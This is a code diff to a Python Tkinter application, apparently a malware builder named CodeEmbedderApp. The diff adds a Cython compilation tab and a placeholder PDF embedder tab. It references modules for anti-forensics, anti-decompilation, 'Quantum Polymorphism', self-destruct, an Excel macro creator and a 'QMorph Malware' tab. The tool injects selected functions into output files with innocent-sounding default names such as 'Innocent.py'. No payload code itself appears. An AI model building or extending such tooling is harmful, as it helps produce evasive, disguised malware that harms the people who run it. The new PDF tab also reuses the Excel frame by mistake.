@@ -4,6 +4,7 @@ import os
 import Code_Embedding.code_embedder as ce
 import Quantum_Polymorphism.QMorph as qm
 import glob  # For file pattern matching
+import Anti_Decompilation.Cython.compiler as adc
 
 
 class ToolTip:
@@ -308,7 +309,8 @@ class CodeEmbedderApp:
             return
 
         # Prepare lists of embed code filenames and function names
-        embed_code_filenames = [os.path.join(self.anti_forensics_dir, f"{func.split('call_')[1]}.py") for func in selected_checks]
+        embed_code_filenames = [os.path.join(self.anti_forensics_dir, f"{func.split('call_')[1]}.py") for func in
+                                selected_checks]
         print(f"{embed_code_filenames} ")
         func_names = [func for func in selected_checks]  # Assuming func is already the function name
 
@@ -549,11 +551,120 @@ class CodeEmbedderApp:
         self.notebook.add(self.excel_macro_frame, text="Macro Excel Creator")
         ttk.Label(self.excel_macro_frame, text="Excel Macro Creator will go here.").grid(row=0, column=0, sticky="nsew")
 
+    def create_embed_in_pdf_tab(self):
+        """Create the Pdf Embedder tab (Placeholder)."""
+        self.excel_macro_frame = ttk.Frame(self.notebook, padding="10")
+        self.notebook.add(self.excel_macro_frame, text="Macro Excel Creator")
+        ttk.Label(self.excel_macro_frame, text="Pdf Embedder will go here.").grid(row=0, column=0, sticky="nsew")
+
     def create_cython_tab(self):
-        """Create the Compile with Cython tab (Placeholder)."""
+        """Create the Compile with Cython tab for taking a Python file input, showing code, and compiling with Cython."""
         self.cython_frame = ttk.Frame(self.notebook, padding="10")
         self.notebook.add(self.cython_frame, text="Compile with Cython")
-        ttk.Label(self.cython_frame, text="Cython compilation will go here.").grid(row=0, column=0, sticky="nsew")
+
+        # Initialize variables
+        self.cython_code_path = ""
+        self.cython_output_file_name = StringVar(value="")
+
+        # Top Frame for file uploading and showing code
+        top_frame = ttk.Frame(self.cython_frame)
+        top_frame.grid(row=0, column=0, sticky="ew")
+        top_frame.columnconfigure(1, weight=1)
+
+        # Python File Upload Section
+        ttk.Label(top_frame, text="Python File to Compile:").grid(row=0, column=0, sticky="w", padx=5, pady=5)
+        self.upload_cython_file_btn = ttk.Button(top_frame, text="Upload Python File", command=self.load_cython_file)
+        self.upload_cython_file_btn.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
+
+        # Info Icon and Tooltip for Upload
+        info_icon = tk.Label(top_frame, text="ℹ️", font=("Arial", 14), cursor="hand2")
+        info_icon.grid(row=0, column=2, sticky="w", padx=5, pady=5)
+        cython_tooltip_text = "Upload a .py file to compile with Cython. Only .py files are accepted."
+        cython_tooltip = ToolTip(info_icon, cython_tooltip_text)
+
+        # Display Box for code preview
+        self.code_display_box_cython = tk.Text(self.cython_frame, wrap=tk.WORD, background="#f0f0f0", height=10)
+        self.code_display_box_cython.grid(row=1, column=0, sticky="nsew", padx=10, pady=10)
+
+        # Middle Frame for output file name and options
+        middle_frame = ttk.Frame(self.cython_frame)
+        middle_frame.grid(row=2, column=0, sticky="ew", padx=10, pady=10)
+        middle_frame.columnconfigure(1, weight=1)
+
+        # Output File Name Entry
+        ttk.Label(middle_frame, text="Output File Name (.pyc):").grid(row=0, column=0, sticky="e", padx=5, pady=5)
+        self.file_name_entry_cython = ttk.Entry(middle_frame, textvariable=self.cython_output_file_name)
+        self.file_name_entry_cython.grid(row=0, column=1, sticky="ew", padx=5, pady=5)
+
+        # Submit Button
+        self.cython_submit_btn = ttk.Button(self.cython_frame, text="Submit", command=self.submit_cython, padding=10)
+        self.cython_submit_btn.grid(row=3, column=0, pady=10, sticky="ew")
+
+        # Result display box for compilation output
+        self.result_box_cython = tk.Text(self.cython_frame, wrap=tk.WORD, background="#d9f0f0", height=10)
+        self.result_box_cython.grid(row=4, column=0, sticky="nsew", padx=10, pady=10)
+
+    def load_cython_file(self):
+        """Load the Python file for Cython compilation."""
+        self.cython_code_path = filedialog.askopenfilename(
+            title="Select Python File to Compile",
+            filetypes=[("Python files", "*.py")]
+        )
+        if self.cython_code_path:
+            with open(self.cython_code_path, 'r') as f:
+                code_content = f.read()
+            self.code_display_box_cython.delete(1.0, tk.END)
+            self.code_display_box_cython.insert(tk.END, code_content)
+
+    def submit_cython(self):
+        """Submit the file for compilation with Cython."""
+        input_file = self.cython_code_path
+        output_file = self.cython_output_file_name.get().strip()
+
+        if not input_file:
+            messagebox.showerror("Error", "Please upload a Python file to compile.")
+            return
+
+        # Check if output file has .pyc extension, if not, add it
+        if not output_file.endswith(".pyc"):
+            output_file += ".pyc"
+
+        # If no output file name specified, generate default unique name
+        if not output_file or output_file == ".pyc":
+            base_name = "CythonCompiled"
+            counter = 0
+            while os.path.exists(f"Output/{base_name}{counter}.pyc"):
+                counter += 1
+            output_file = f"{base_name}{counter}.pyc"
+
+        # Create output directory if it doesn't exist
+        os.makedirs("Output", exist_ok=True)
+        output_path = os.path.join("Output", output_file)
+
+        # Run the cython compiler
+        success, location = self.cython_compiler(input_file, output_path)
+        # success = adc.compile_with_cython(input_file, output_path)
+
+        # Display results
+        self.result_box_cython.delete(1.0, tk.END)
+        if success:
+            self.result_box_cython.insert(tk.END, f"Compilation Successful!\nOutput saved to: {output_path}")
+        else:
+            self.result_box_cython.insert(tk.END, "An error occurred during compilation.")
+
+    def cython_compiler(self, input_file, output_file):
+        """Compile a Python file using Cython to produce a .pyc output."""
+        try:
+            from Self_Destruct.compile import compile_with_cython
+            # Actual Cython compilation call, replace with your import and actual call from compile.py
+            location = compile_with_cython(input_file, output_file)  # Replace with actual function call
+            if location is not None:
+                return True, location
+            else:
+                return False, None
+        except Exception as e:
+            print(f"Compilation Error: {e}")
+            return False, None
 
     def create_qmorph_tab(self):
         """Create the QMorph Malware tab."""
@@ -668,7 +779,7 @@ class CodeEmbedderApp:
         """Perform the embedding process and display the final code output for Custom mode."""
         new_name = self.new_file_name_custom.get()
         if new_name != "Output/Innocent.py" and new_name != "":
-            new_name = "Output/" +new_name
+            new_name = "Output/" + new_name
         loc_to_inject = self.loc_to_inject_custom.get()
         func_name = self.selected_function_custom.get()
         wrap = self.wrap_custom.get()
